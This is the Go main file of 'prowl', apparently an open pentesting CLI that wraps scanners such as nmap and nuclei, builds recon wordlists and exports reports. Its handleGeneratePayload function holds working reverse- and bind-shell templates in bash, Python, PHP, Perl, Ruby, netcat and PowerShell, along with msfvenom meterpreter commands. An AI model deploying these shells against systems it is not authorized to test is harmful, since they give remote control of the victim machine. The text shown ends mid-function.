package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"time"

	"github.com/foxinwinter/prowl/internal/auto"
	"github.com/foxinwinter/prowl/internal/config"
	"github.com/foxinwinter/prowl/internal/export"
	"github.com/foxinwinter/prowl/internal/repl"
	"github.com/foxinwinter/prowl/internal/tools"
	"github.com/foxinwinter/prowl/internal/wordlist"
)

var (
	version = "dev"
	commit  = "none"
	date    = "unknown"
)

const asciiBanner = `▀▀▀▀█▄▀▀▀▀█▄ ▄█▀█▄ █▄   ▄█ ██
 ██▄█▀ ██▄█▀ ██ ██ ██   ██ ██
 ██    ██ ██ ██ ██ ██ █ ██ ██ ▄█
 █▀    █▀ ▀█ ▀█▄█▀ ▀█▄▀▄█▀ ▀█▄██
                                v%s
 Security Research CLI · Automated Pentesting
`

func main() {
	configPath := flag.String("config", "", "path to config file")
	target := flag.String("target", "", "target to scan")
	autoMode := flag.Bool("auto", false, "run automated scan without REPL")
	scanType := flag.String("scan", "all", "scan type: recon, vuln, secrets, webapp, ad, network, all")
	format := flag.String("format", "md", "output format: md, html, json, csv, sarif, burp, nessus")
	severity := flag.String("severity", "", "filter findings by severity (critical,high,medium,low,info)")
	verbose := flag.Bool("verbose", false, "enable verbose output")
	quiet := flag.Bool("quiet", false, "minimal output")
	jsonOutput := flag.Bool("json", false, "output results as JSON")
	output := flag.String("output", "output", "output directory for reports")
	proxy := flag.String("proxy", "", "HTTP proxy to use for requests")
	profile := flag.String("profile", "normal", "scan profile: quick, normal, thorough, paranoid")
	exploit := flag.Bool("exploit", false, "enable exploitation phase (use with caution)")
	showVersion := flag.Bool("version", false, "show version info")
	listTools := flag.Bool("list-tools", false, "list all detected security tools")
	listCommands := flag.Bool("list-commands", false, "list all REPL commands")
	listWordlists := flag.Bool("list-wordlists", false, "list all embedded wordlists")
	listExports := flag.Bool("list-exports", false, "list all export formats")
	resume := flag.Bool("resume", false, "resume interrupted scan")
	listProfiles := flag.Bool("list-profiles", false, "list available scan profiles")
	listBuiltin := flag.Bool("list-auto", false, "list available auto scan modules")
	autoModule := flag.String("auto-module", "", "specific auto module: recon, webapp, ad, network, full")
	initConfig := flag.Bool("init-config", false, "create default config file at ~/.config/prowl/config.yaml")
	updateConfig := flag.Bool("update-config", false, "update existing config file with new defaults")
	generateReport := flag.String("generate-report", "", "generate report from findings JSON file")
	validateTarget := flag.Bool("validate-target", false, "check if target is alive")
	installTool := flag.String("install-tool", "", "install a missing security tool")
	uninstallTool := flag.String("uninstall-tool", "", "uninstall a security tool")
	updateTools := flag.Bool("update-tools", false, "update all installed security tools")
	checkUpdates := flag.Bool("check-updates", false, "check for prowl updates")
	selfUpdate := flag.Bool("self-update", false, "update prowl binary to latest version")
	flag.Parse()

	args := flag.Args()

	if *showVersion {
		fmt.Printf("prowl %s (commit: %s, built: %s)\n", version, commit, date)
		os.Exit(0)
	}

	if !*quiet {
		printBanner()
	}

	if *initConfig {
		handleInitConfig()
		os.Exit(0)
	}

	if *updateConfig {
		handleUpdateConfig()
		os.Exit(0)
	}

	if *generateReport != "" {
		handleGenerateReport(*generateReport, *format)
		os.Exit(0)
	}

	if *listTools {
		handleListTools()
		os.Exit(0)
	}

	if *listProfiles {
		handleListProfiles()
		os.Exit(0)
	}

	if *listBuiltin {
		handleListAuto()
		os.Exit(0)
	}

	if *listCommands {
		handleListCommands()
		os.Exit(0)
	}

	if *listWordlists {
		handleListWordlists()
		os.Exit(0)
	}

	if *listExports {
		handleListExports()
		os.Exit(0)
	}

	if *checkUpdates {
		handleCheckUpdates()
		os.Exit(0)
	}

	if *selfUpdate {
		handleSelfUpdate()
		os.Exit(0)
	}

	if *installTool != "" {
		handleInstallTool(*installTool)
		os.Exit(0)
	}

	if *uninstallTool != "" {
		handleUninstallTool(*uninstallTool)
		os.Exit(0)
	}

	if *updateTools {
		handleUpdateTools()
		os.Exit(0)
	}

	if len(args) > 0 {
		switch args[0] {
		case "run":
			handleRunSubcommand(args[1:])
			return
		case "script":
			handleScriptSubcommand(args[1:])
			return
		case "generate":
			handleGenerateSubcommand(args[1:])
			return
		default:
			fmt.Fprintf(os.Stderr, "unknown subcommand: %s\n", args[0])
			fmt.Fprintln(os.Stderr, "available subcommands: run, script, generate")
			os.Exit(1)
		}
	}

	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "config error: %v\n", err)
		os.Exit(1)
	}

	if *configPath != "" {
		cfg, err = config.LoadFile(*configPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "config error: %v\n", err)
			os.Exit(1)
		}
	}

	config.MergeFlags(cfg, config.Flags{
		OutputDir: output,
		ProxyAddr: proxy,
		Severity:  severity,
	})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		if !*quiet {
			fmt.Fprintln(os.Stderr, "\ninterrupted, saving state...")
		}
		cancel()
		os.Exit(1)
	}()

	if *validateTarget && *target != "" {
		handleValidateTarget(*target)
		os.Exit(0)
	}

	if !*quiet {
		checkToolsWithVersion()
	}

	scanType = validateScanType(*scanType)
	format = validateFormat(*format)

	if *autoMode || (*target != "" && *autoModule == "") || *autoModule != "" {
		if *target == "" {
			fmt.Fprintln(os.Stderr, "error: --target is required in auto mode")
			os.Exit(1)
		}

		pipeline := auto.NewPipeline(*output, cfg.Threads, *verbose, cfg.ProxyAddr)
		pipeline.SetProfile(*profile)

		if *scanType != "all" {
			pipeline.SetScanType(*scanType)
		}

		pipeline.SetFormat(*format)
		pipeline.SetSeverity(*severity)
		pipeline.SetQuiet(*quiet)
		pipeline.SetJSONOutput(*jsonOutput)
		pipeline.SetExploit(*exploit)

		if *resume {
			if !*quiet {
				fmt.Println("\033[33mAttempting to resume previous scan...\033[0m")
			}
		}

		if *autoModule != "" {
			switch *autoModule {
			case "recon":
				runAutoRecon(ctx, pipeline, *target)
			case "webapp":
				runAutoWebApp(ctx, pipeline, *target)
			case "ad":
				runAutoAD(ctx, pipeline, *target)
			case "network":
				runAutoNetwork(ctx, pipeline, *target)
			case "full":
				_, err := pipeline.AutoFull(ctx, *target)
				if err != nil {
					fmt.Fprintf(os.Stderr, "scan failed: %v\n", err)
					os.Exit(1)
				}
			default:
				fmt.Fprintf(os.Stderr, "unknown auto module: %s\n", *autoModule)
				fmt.Fprintln(os.Stderr, "available modules: recon, webapp, ad, network, full")
				os.Exit(1)
			}
		} else {
			_, err := pipeline.AutoFull(ctx, *target)
			if err != nil {
				fmt.Fprintf(os.Stderr, "scan failed: %v\n", err)
				os.Exit(1)
			}
		}
		return
	}

	r := repl.New()
	if *target != "" {
		r.SetTarget(*target)
	}
	if err := r.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "REPL error: %v\n", err)
		os.Exit(1)
	}
}

func printBanner() {
	if !isTerminal() {
		return
	}
	fmt.Print("\033[2J\033[H\n")
	fmt.Fprintf(os.Stderr, asciiBanner, version)
	fmt.Fprintln(os.Stderr)
}

func isTerminal() bool {
	fi, err := os.Stdout.Stat()
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeCharDevice != 0
}

// ===== SUBCOMMAND HANDLERS =====

func handleRunSubcommand(args []string) {
	if len(args) == 0 {
		fmt.Fprintln(os.Stderr, "usage: prowl run <tool> [args...]")
		fmt.Fprintln(os.Stderr, "example: prowl run nmap -sV target.com")
		os.Exit(1)
	}

	toolName := args[0]
	toolArgs := args[1:]

	if !tools.ToolExists(toolName) {
		fmt.Fprintf(os.Stderr, "error: tool '%s' not found in PATH\n", toolName)
		fmt.Fprintf(os.Stderr, "install it with: prowl --install-tool %s\n", toolName)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[36mrunning %s %s\033[0m\n", toolName, strings.Join(toolArgs, " "))

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()

	result := tools.Run(ctx, toolName, toolArgs, tools.DefaultRunOptions())

	if result.Stdout != "" {
		fmt.Print(result.Stdout)
	}
	if result.Stderr != "" {
		fmt.Fprint(os.Stderr, result.Stderr)
	}

	if result.Err != nil {
		fmt.Fprintf(os.Stderr, "\n\033[31mtool exited with error: %v (exit code: %d)\033[0m\n", result.Err, result.ExitCode)
		os.Exit(result.ExitCode)
	}

	fmt.Fprintf(os.Stderr, "\n\033[32mcompleted in %s\033[0m\n", result.Duration.Round(time.Millisecond))
}

func handleScriptSubcommand(args []string) {
	if len(args) == 0 {
		fmt.Fprintln(os.Stderr, "usage: prowl script <script.prowl>")
		fmt.Fprintln(os.Stderr, "example: prowl script scan.prowl")
		os.Exit(1)
	}

	scriptPath := args[0]
	data, err := os.ReadFile(scriptPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading script: %v\n", err)
		os.Exit(1)
	}

	r := repl.New()
	r.SetScriptMode(true)

	lines := strings.Split(string(data), "\n")
	cmdCount := 0
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		cmdCount++
		fmt.Fprintf(os.Stderr, "\033[90m[%d]\033[0m \033[36m%s\033[0m\n", i+1, line)

		if err := r.ExecuteScriptLine(line); err != nil {
			fmt.Fprintf(os.Stderr, "\033[31mscript error at line %d: %v\033[0m\n", i+1, err)
		}
	}

	r.SetScriptMode(false)
	fmt.Fprintf(os.Stderr, "\n\033[32mscript executed: %d commands\033[0m\n", cmdCount)
}

func handleGenerateSubcommand(args []string) {
	if len(args) == 0 {
		fmt.Fprintln(os.Stderr, "usage: prowl generate <type> [options]")
		fmt.Fprintln(os.Stderr, "types:")
		fmt.Fprintln(os.Stderr, "  wordlist  - generate a wordlist from target")
		fmt.Fprintln(os.Stderr, "  report    - generate report from findings file")
		fmt.Fprintln(os.Stderr, "  payload   - generate a payload")
		os.Exit(1)
	}

	genType := args[0]
	flags := flag.NewFlagSet("generate", flag.ExitOnError)
	target := flags.String("target", "", "target for generation")
	outputPath := flags.String("output", "", "output file path")
	findingsFile := flags.String("findings", "", "findings JSON file")
	reportFormat := flags.String("format", "html", "output format")
	payloadType := flags.String("type", "", "payload type: reverse-shell, bind-shell, meterpreter")
	lhost := flags.String("lhost", "", "local host for payload")
	lport := flags.String("lport", "", "local port for payload")
	payloadFormat := flags.String("payload-format", "raw", "payload format: raw, hex, python, c, bash")
	flags.Parse(args[1:])

	switch genType {
	case "wordlist":
		handleGenerateWordlist(*target, *outputPath)
	case "report":
		handleGenerateReport(*findingsFile, *reportFormat)
	case "payload":
		handleGeneratePayload(*payloadType, *lhost, *lport, *payloadFormat, *outputPath)
	default:
		fmt.Fprintf(os.Stderr, "unknown generate type: %s\n", genType)
		os.Exit(1)
	}
}

func handleGenerateWordlist(target, outputPath string) {
	if target == "" {
		fmt.Fprintln(os.Stderr, "error: --target is required")
		os.Exit(1)
	}

	domain := strings.TrimPrefix(target, "https://")
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.Split(domain, "/")[0]
	domain = strings.Split(domain, ":")[0]

	subdomains := []string{
		"www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "mx",
		"ns1", "ns2", "ns3", "dns", "dns1", "dns2",
		"admin", "portal", "login", "signin", "sso", "auth", "api", "dev", "staging",
		"test", "beta", "demo", "sandbox", "ci", "cd", "git", "gitlab", "bitbucket",
		"jenkins", "travis", "circleci", "docker", "registry", "k8s", "kube", "rancher",
		"grafana", "prometheus", "kibana", "elastic", "elasticsearch", "logstash", "splunk",
		"jira", "confluence", "wiki", "docs", "help", "support", "status", "monitor",
		"cdn", "assets", "static", "media", "img", "images", "files", "download",
		"vpn", "gateway", "proxy", "lb", "haproxy", "nginx", "apache", "caddy",
		"db", "database", "mysql", "postgres", "mongo", "redis", "memcache", "elastic",
		"backup", "bak", "old", "archive", "legacy", "v1", "v2", "v3",
		"internal", "intranet", "private", "corp", "office", "hq", "branch",
		"crm", "erp", "hr", "finance", "payroll", "invoice", "billing",
		"app", "mobile", "ios", "android", "m", "wap",
		"shop", "store", "cart", "checkout", "order", "payment",
		"blog", "forum", "community", "chat", "messaging", "slack", "teams",
		"search", "engine", "index", "catalog",
	}

	var words []string
	words = append(words, domain)
	words = append(words, "www."+domain)
	words = append(words, domain+".com")
	words = append(words, domain+".net")
	words = append(words, domain+".org")
	words = append(words, "api."+domain)
	words = append(words, "dev."+domain)
	words = append(words, "staging."+domain)
	words = append(words, "test."+domain)
	words = append(words, "admin."+domain)

	for _, sub := range subdomains {
		words = append(words, sub+"."+domain)
		words = append(words, sub+"-"+domain)
		words = append(words, domain+"-"+sub)
	}

	paths := []string{
		"/", "/robots.txt", "/sitemap.xml", "/.env", "/config", "/admin",
		"/login", "/api", "/api/v1", "/api/v2", "/docs", "/swagger",
		"/backup", "/.git", "/.svn", "/wp-admin", "/wp-login.php",
		"/phpmyadmin", "/server-status", "/.htaccess", "/crossdomain.xml",
		"/favicon.ico", "/.well-known/", "/wp-content", "/wp-includes",
		"/administrator", "/cpanel", "/webmail", "/phpinfo.php",
		"/server-info", "/elmah.axd", "/trace.axd", "/.config",
		"/database", "/db", "/sql", "/dump", "/export",
	}

	sort.Strings(words)
	unique := make(map[string]bool)
	var deduped []string
	for _, w := range words {
		if !unique[w] {
			unique[w] = true
			deduped = append(deduped, w)
		}
	}

	var buf bytes.Buffer
	for _, w := range deduped {
		buf.WriteString(w + "\n")
	}
	for _, p := range paths {
		buf.WriteString(domain + p + "\n")
	}

	if outputPath == "" {
		outputPath = domain + "-wordlist.txt"
	}

	if err := os.WriteFile(outputPath, buf.Bytes(), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "error writing wordlist: %v\n", err)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[32mgenerated %d words -> %s\033[0m\n", len(deduped)+len(paths), outputPath)
}

func handleGeneratePayload(payloadType, lhost, lport, payloadFormat, outputPath string) {
	if payloadType == "" {
		fmt.Fprintln(os.Stderr, "error: --type is required (reverse-shell, bind-shell, meterpreter)")
		os.Exit(1)
	}
	if lhost == "" {
		fmt.Fprintln(os.Stderr, "error: --lhost is required")
		os.Exit(1)
	}

	if lport == "" {
		lport = "4444"
	}

	var payload string
	var ext string

	switch payloadType {
	case "reverse-shell", "bash":
		payload = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
		ext = "sh"
	case "reverse-shell-python":
		payload = fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, lhost, lport)
		ext = "py"
	case "reverse-shell-php":
		payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, lhost, lport)
		ext = "php"
	case "reverse-shell-perl":
		payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, lhost, lport)
		ext = "pl"
	case "reverse-shell-ruby":
		payload = fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, lhost, lport)
		ext = "rb"
	case "reverse-shell-nc":
		payload = fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport)
		ext = "sh"
	case "reverse-shell-powershell":
		payload = fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, lhost, lport)
		ext = "ps1"
	case "bind-shell":
		payload = fmt.Sprintf("nc -lvp %s -e /bin/sh", lport)
		ext = "sh"
	case "bind-shell-php":
		payload = fmt.Sprintf(`php -r '$sock=fsockopen("0.0.0.0",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, lport)
		ext = "php"
	case "meterpreter":
		payload = fmt.Sprintf("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o payload.elf", lhost, lport)
		ext = "elf"
	case "meterpreter-windows":
		payload = fmt.Sprintf("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o payload.exe", lhost, lport)
		ext = "exe"
	default:
		fmt.Fprintf(os.Stderr, "unknown payload type: %s\n", payloadType)
		fmt.Fprintln(os.Stderr, "available types: reverse-shell, reverse-shell-python, reverse-shell-php,")
		fmt.Fprintln(os.Stderr, "  reverse-shell-perl, reverse-shell-ruby, reverse-shell-nc,")
		fmt.Fprintln(os.Stderr, "  reverse-shell-powershell, bind-shell, bind-shell-php,")
		fmt.Fprintln(os.Stderr, "  meterpreter, meterpreter-windows")
		os.Exit(1)
	}

	if outputPath == "" {
		outputPath = "payload." + ext
	}

	if err := os.WriteFile(outputPath, []byte(payload+"\n"), 0755); err != nil {
		fmt.Fprintf(os.Stderr, "error writing payload: %v\n", err)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[32mgenerated %s payload -> %s\033[0m\n", payloadType, outputPath)
	fmt.Fprintf(os.Stderr, "\033[90m%s\033[0m\n", payload)
}

// ===== LIST COMMANDS =====

func handleListTools() {
	fmt.Println("\n\033[1;37mSecurity Tools\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	results := tools.DetectAll()

	categories := make(map[tools.Category][]tools.DetectionResult)
	for _, r := range results {
		categories[r.Tool.Category] = append(categories[r.Tool.Category], r)
	}

	catOrder := []tools.Category{
		tools.CategoryScanning,
		tools.CategoryWebScanning,
		tools.CategoryExploitation,
		tools.CategoryPasswordCrack,
		tools.CategoryNetwork,
		tools.CategoryPostExploit,
		tools.CategoryWireless,
		tools.CategoryForensics,
		tools.CategoryOSINT,
		tools.CategoryReverseEng,
		tools.CategorySSLTLS,
		tools.CategoryProxyMITM,
		tools.CategoryVulnScan,
		tools.CategoryUtilities,
		tools.CategoryMSF,
		tools.CategoryOther,
	}

	available := 0
	missing := 0

	for _, cat := range catOrder {
		toolsList, ok := categories[cat]
		if !ok {
			continue
		}

		fmt.Fprintf(os.Stderr, "\n\033[1;36m%s\033[0m\n", cat)

		for _, t := range toolsList {
			if t.Found {
				version := t.Version
				if version == "" {
					version = "installed"
				}
				if len(version) > 40 {
					version = version[:37] + "..."
				}
				fmt.Printf("  \033[32m✓\033[0m %-22s \033[90m%s\033[0m\n", t.Tool.Name, version)
				available++
			} else {
				fmt.Printf("  \033[31m✗\033[0m %-22s \033[90m%s (apt: %s)\033[0m\n", t.Tool.Name, t.Tool.Description, t.Tool.PackageApt)
				missing++
			}
		}
	}

	fmt.Printf("\n\033[32m%d available\033[0m, \033[31m%d missing\033[0m\n", available, missing)
}

func handleListCommands() {
	fmt.Println("\n\033[1;37mREPL Commands\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	commands := []struct {
		name string
		desc string
		cat  string
	}{
		{"target (t)", "set or manage current target", "core"},
		{"target clear", "clear current target", "core"},
		{"target info", "show current target info", "core"},
		{"recon (rc)", "quick reconnaissance on target", "scanning"},
		{"scan (sc)", "run vulnerability scan", "scanning"},
		{"scan quick", "quick scan (common ports)", "scanning"},
		{"scan full", "full port scan", "scanning"},
		{"nmap", "run nmap scan", "scanning"},
		{"nmap-os", "OS detection scan", "scanning"},
		{"nmap-svc", "service version detection", "scanning"},
		{"nmap-nse", "run NSE scripts", "scanning"},
		{"nmap-vuln", "vulnerability scan with NSE", "scanning"},
		{"nmap-smb", "SMB-specific scan", "scanning"},
		{"nmap-ssl", "SSL/TLS scan", "scanning"},
		{"nmap-full", "comprehensive nmap scan", "scanning"},
		{"masscan", "fast port scan with masscan", "scanning"},
		{"unicorn", "port scan with unicornscan", "scanning"},
		{"zmap", "internet-wide port scan", "scanning"},
		{"hping3", "host discovery with hping3", "scanning"},
		{"lbd", "load balancing detection", "scanning"},
		{"httpx", "HTTP probing and tech detection", "web"},
		{"nuclei", "template-based vuln scanning", "web"},
		{"nikto", "web server scanner", "web"},
		{"whatweb", "technology fingerprinting", "web"},
		{"wpscan", "WordPress security scanner", "web"},
		{"gobuster", "directory/DNS brute-force", "web"},
		{"wfuzz", "web application fuzzer", "web"},
		{"ffuf", "fast web fuzzer", "web"},
		{"fuzz-full", "full fuzzing with wordlists", "web"},
		{"set-target", "set fuzzing target", "web"},
		{"set-profile", "set scan profile", "config"},
		{"bounty", "show bug bounty programs", "info"},
		{"report", "generate security report", "output"},
		{"export", "export findings to file", "output"},
		{"notes", "manage scan notes", "session"},
		{"bookmark", "manage bookmarks", "session"},
		{"wordlist", "wordlist operations", "utilities"},
		{"auto", "run automated scan", "scanning"},
		{"tools", "show installed tools", "info"},
		{"config", "manage configuration", "config"},
		{"history", "command history", "session"},
		{"script", "run script file", "execution"},
		{"batch", "run commands from stdin", "execution"},
		{"examples", "show usage examples", "info"},
		{"help", "show available commands", "info"},
		{"quit (q, exit)", "exit prowl", "core"},
		{"clear", "clear terminal", "core"},
	}

	currentCat := ""
	for _, c := range commands {
		if c.cat != currentCat {
			currentCat = c.cat
			fmt.Fprintf(os.Stderr, "\n\033[1;35m%s\033[0m\n", strings.ToUpper(currentCat))
		}
		fmt.Printf("  \033[32m%-22s\033[0m %s\n", c.name, c.desc)
	}
}

func handleListWordlists() {
	fmt.Println("\n\033[1;37mEmbedded Wordlists\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	wlNames := wordlist.ListWordlists()
	sort.Strings(wlNames)

	for _, name := range wlNames {
		size := wordlist.WordlistSize(name)
		fmt.Printf("  \033[32m%-25s\033[0m \033[90m%d entries\033[0m\n", name, size)
	}

	fmt.Printf("\n\033[36m%d wordlists available\033[0m\n", len(wlNames))
}

func handleListExports() {
	fmt.Println("\n\033[1;37mExport Formats\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	formats := []struct {
		name string
		desc string
		ext  string
	}{
		{"json", "JSON findings export", ".json"},
		{"csv", "CSV spreadsheet format", ".csv"},
		{"html", "HTML report with styling", ".html"},
		{"sarif", "SARIF static analysis format", ".sarif"},
		{"burp", "Burp Suite XML import format", ".xml"},
		{"nessus", "Nessus compatible format", ".nessus"},
		{"jira", "Jira ticket format", ".csv"},
		{"pdf-ready", "PDF-ready HTML for printing", ".html"},
		{"markdown", "Markdown report", ".md"},
	}

	for _, f := range formats {
		fmt.Printf("  \033[32m%-15s\033[0m %-40s \033[90m(%s)\033[0m\n", f.name, f.desc, f.ext)
	}
}

func handleListProfiles() {
	fmt.Println("\n\033[1;37mScan Profiles\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	profileList := []struct {
		name        string
		desc        string
		stealth     int
		time        string
	}{
		{"passive", "Passive recon only (no active scanning)", 10, "~5min"},
		{"quick", "Fast recon: nmap -T4, httpx, whatweb", 6, "~10min"},
		{"normal", "Standard reconnaissance and scanning", 4, "~30min"},
		{"thorough", "Comprehensive scanning with all tools", 2, "~2hr"},
		{"paranoid", "Maximum stealth, slow scanning", 8, "~4hr"},
		{"web", "Web application focused testing", 4, "~45min"},
		{"api", "API endpoint testing", 5, "~30min"},
		{"wifi", "Wireless network assessment", 3, "~1hr"},
		{"ad", "Active Directory assessment", 3, "~2hr"},
		{"mobile", "Mobile application analysis", 4, "~1hr"},
		{"forensics", "Forensic file analysis", 5, "~30min"},
		{"creds", "Credential testing and brute force", 3, "~1hr"},
		{"internal", "Internal network assessment", 3, "~2hr"},
		{"cloud", "Cloud infrastructure audit", 4, "~1hr"},
	}

	for _, p := range profileList {
		fmt.Printf("  \033[32m%-15s\033[0m %-45s stealth: %d/10 ~%s\n", p.name, p.desc, p.stealth, p.time)
	}
}

func handleListAuto() {
	fmt.Println("\n\033[1;37mAuto Scan Modules\033[0m")
	fmt.Println(strings.Repeat("─", 60))

	modules := []struct {
		name string
		desc string
	}{
		{"recon", "Enhanced passive+active+deep reconnaissance"},
		{"webapp", "Focused web application testing (sqli, xss, dirs, tech)"},
		{"ad", "Active Directory assessment (smb, users, bloodhound)"},
		{"network", "Network assessment (ports, services, os, vulns)"},
		{"full", "Comprehensive pentest (all modules combined)"},
	}

	for _, m := range modules {
		fmt.Printf("  \033[32m%-15s\033[0m %s\n", m.name, m.desc)
	}

	fmt.Println("\n\033[90mUsage: prowl --auto --auto-module <module> --target <target>\033[0m")
}

// ===== MANAGEMENT COMMANDS =====

func handleInitConfig() {
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error loading default config: %v\n", err)
		os.Exit(1)
	}

	if err := config.Save(cfg); err != nil {
		fmt.Fprintf(os.Stderr, "error saving config: %v\n", err)
		os.Exit(1)
	}

	home, _ := os.UserHomeDir()
	path := filepath.Join(home, ".config", "prowl", "config.yaml")
	fmt.Fprintf(os.Stderr, "\033[32mconfig created at %s\033[0m\n", path)
}

func handleUpdateConfig() {
	existing, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error loading existing config: %v\n", err)
		os.Exit(1)
	}

	defaults, _ := config.Load()

	existing.Version = defaults.Version

	if err := config.Save(existing); err != nil {
		fmt.Fprintf(os.Stderr, "error saving config: %v\n", err)
		os.Exit(1)
	}

	home, _ := os.UserHomeDir()
	path := filepath.Join(home, ".config", "prowl", "config.yaml")
	fmt.Fprintf(os.Stderr, "\033[32mconfig updated at %s\033[0m\n", path)
}

func handleValidateTarget(target string) {
	if target == "" {
		fmt.Fprintln(os.Stderr, "error: target is required")
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[36mvalidating target: %s\033[0m\n", target)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	url := target
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "https://" + url
	}

	cmd := exec.CommandContext(ctx, "curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}", "-L", "--max-time", "5", url)
	output, err := cmd.CombinedOutput()

	if err != nil {
		cmd = exec.CommandContext(ctx, "curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}", "-L", "--max-time", "5", "http://"+target)
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Fprintf(os.Stderr, "\033[31m✗ target unreachable: %v\033[0m\n", err)
			os.Exit(1)
		}
	}

	statusCode := strings.TrimSpace(string(output))
	switch {
	case strings.HasPrefix(statusCode, "2"):
		fmt.Fprintf(os.Stderr, "\033[32m✓ target is alive (HTTP %s)\033[0m\n", statusCode)
	case strings.HasPrefix(statusCode, "3"):
		fmt.Fprintf(os.Stderr, "\033[33m⚠ target redirected (HTTP %s)\033[0m\n", statusCode)
	case strings.HasPrefix(statusCode, "4"):
		fmt.Fprintf(os.Stderr, "\033[33m⚠ target returned client error (HTTP %s)\033[0m\n", statusCode)
	case strings.HasPrefix(statusCode, "5"):
		fmt.Fprintf(os.Stderr, "\033[31m✗ target returned server error (HTTP %s)\033[0m\n", statusCode)
	default:
		fmt.Fprintf(os.Stderr, "\033[90m? target responded (HTTP %s)\033[0m\n", statusCode)
	}
}

func handleInstallTool(name string) {
	fmt.Fprintf(os.Stderr, "\033[36minstalling %s...\033[0m\n", name)

	results := tools.DetectAll()
	var toolInfo *tools.DetectionResult
	for _, r := range results {
		if r.Tool.Name == name || r.Tool.Binary == name {
			toolInfo = &r
			break
		}
	}

	if toolInfo != nil && toolInfo.Found {
		fmt.Fprintf(os.Stderr, "\033[33m%s is already installed\033[0m\n", name)
		return
	}

	pkg := name
	if toolInfo != nil {
		pkg = toolInfo.Tool.PackageApt
	}

	cmd := exec.Command("sudo", "apt-get", "install", "-y", pkg)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31minstall failed: %v\033[0m\n", err)
		fmt.Fprintln(os.Stderr, "try: sudo apt-get install "+pkg)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[32m%s installed successfully\033[0m\n", name)
}

func handleUninstallTool(name string) {
	fmt.Fprintf(os.Stderr, "\033[36muninstalling %s...\033[0m\n", name)

	results := tools.DetectAll()
	var toolInfo *tools.DetectionResult
	for _, r := range results {
		if r.Tool.Name == name || r.Tool.Binary == name {
			toolInfo = &r
			break
		}
	}

	if toolInfo == nil || !toolInfo.Found {
		fmt.Fprintf(os.Stderr, "\033[33m%s is not installed\033[0m\n", name)
		return
	}

	pkg := toolInfo.Tool.PackageApt

	cmd := exec.Command("sudo", "apt-get", "remove", "-y", pkg)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "\033[31muninstall failed: %v\033[0m\n", err)
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "\033[32m%s uninstalled successfully\033[0m\n", name)
}

func handleUpdateTools() {
